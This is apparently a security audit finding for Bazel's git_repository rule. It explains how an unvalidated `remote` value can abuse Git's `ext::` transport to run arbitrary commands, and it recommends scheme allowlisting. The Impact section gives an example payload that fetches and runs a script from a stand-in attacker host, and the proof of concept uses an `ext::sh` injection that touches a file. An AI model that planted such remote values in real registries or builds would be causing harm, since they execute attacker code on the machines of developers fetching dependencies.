### Title
Argument/Transport Injection via unrestricted `remote` URL in `git_repository` - (File: `tools/build_defs/repo/git_worker.bzl`)

### Summary
`git_repository`/`new_git_repository` accept a `remote` attribute that is forwarded verbatim to `git remote add origin <remote>` and subsequent `git fetch`/`clone` operations, with no scheme validation or `GIT_ALLOW_PROTOCOL` restriction. Because Git supports remote-helper transports such as `ext::<command>`, an attacker who controls the value that ends up in this attribute (e.g., via a Bzlmod registry's `source.json` for a `git_repository`-type module version, which forwards `remote` unchanged per the registry spec) can smuggle a foreign-transport URL that causes Bazel's build machinery to spawn an arbitrary subprocess when the repository rule executes `git`.

### Finding Description
`add_origin` calls `_git(ctx, git_repo, "remote", "add", "origin", remote)` with the raw `ctx.attr.remote` value [1](#0-0) , and `_update`/`fetch` subsequently invoke `git fetch origin` using this configured remote [2](#0-1) . The `_execute` helper builds the final `git` command line and unsets Git-specific environment variables, but does not set `GIT_ALLOW_PROTOCOL` or otherwise constrain which transport helpers Git is allowed to invoke [3](#0-2) . Git's own transport layer natively supports the `ext::<shell-command>` remote helper scheme, which executes an arbitrary command as the transport for the "clone"; this is a documented Git feature, not a Bazel-specific parsing bug, but Bazel does nothing to reject it. The `remote` attribute is declared as a plain, unconstrained `attr.string` in `git.bzl` [4](#0-3) , and the Bzlmod registry format explicitly forwards `remote` unmodified from `source.json` into the underlying `git_repository` rule when a module version's `type` is `git_repository` [5](#0-4) . Unlike the `integrity`/`sha256` fields used for `archive` type sources, there is no checksum or pinning mechanism that binds or sanitizes the `remote` string for `git_repository` sources — it is trusted metadata forwarded straight from the registry response to a live `git` invocation.

### Impact Explanation
If a registry entry (or any code path that composes a `git_repository`/`new_git_repository` invocation from externally-supplied data, e.g., a `module_extension` that reads tag values from a transitive dependency) is filled with a `remote` value such as `ext::sh -c "curl attacker.example/x|sh"`, then during repository fetching Bazel's `git remote add`/`git fetch` will hand this off to Git's `ext` helper, which runs the attacker's shell command with the privileges of the Bazel client process. This is a full arbitrary command execution outside the sandbox, on the machine performing the fetch, structurally analogous to the Voyager `php artisan` argument-injection CVE where an untrusted value reaches a CLI invocation and is interpreted as an executable directive rather than inert data.

### Likelihood Explanation
Reaching this path requires that some untrusted source (a third-party/mirror registry configured via `--registry`, or a compromised/malicious entry merged into a registry index) supply the `remote` field for a `git_repository`-typed module version, or that a module extension forwards attacker-influenced strings into `git_repository(remote=...)`. Because the Bazel Central Registry’s trust model is inherently used for arbitrary third-party registries (`--registry` is fully user/organization configurable and documented to support "third-party or internal registries"), and because nothing in `git.bzl`/`git_worker.bzl` validates that `remote` uses an `http(s)/git/ssh/file` scheme, likelihood is moderate: it requires a project to resolve a module (or a dependency thereof) from an untrusted or compromised registry that uses the `git_repository` source type.

### Recommendation
- Validate `remote` in `git.bzl`/`git_worker.bzl` against an allowlist of schemes (`https://`, `http://`, `ssh://`, `git://`, `file://`, or a plain `user@host:path` SCP-like form), rejecting `ext::`, `fd::`, or any other Git remote-helper invocation syntax.
- Alternatively/additionally, set `GIT_ALLOW_PROTOCOL` (and equivalent `protocol.*.allow` git config) in the environment passed to every `ctx.execute` call in `_execute` to restrict Git to the same allowlisted schemes, defense-in-depth against future Git remote-helper additions.
- Apply the same validation to any registry-supplied `remote` field before it is used to construct a `git_repository`/`new_git_repository` invocation.

### Proof of Concept
A `BuildIntegrationTestCase`/`src/test/shell/bazel` style repro:
1. Set up a local file-based registry (as in `bazel_module_test.py`) with a module version of `type = "git_repository"` whose `source.json` sets `"remote": "ext::sh -c \"touch /tmp/pwned\""`.
2. Add `bazel_dep` on this module in a test workspace's `MODULE.bazel`.
3. Run `bazel build //:target` that depends on the module; the repository rule invokes `add_origin` → `git remote add origin ext::sh -c "touch /tmp/pwned"` → subsequent `fetch()` triggers Git's `ext` helper, executing the shell command and creating `/tmp/pwned` outside any sandbox, demonstrating command execution driven purely by registry-supplied content.
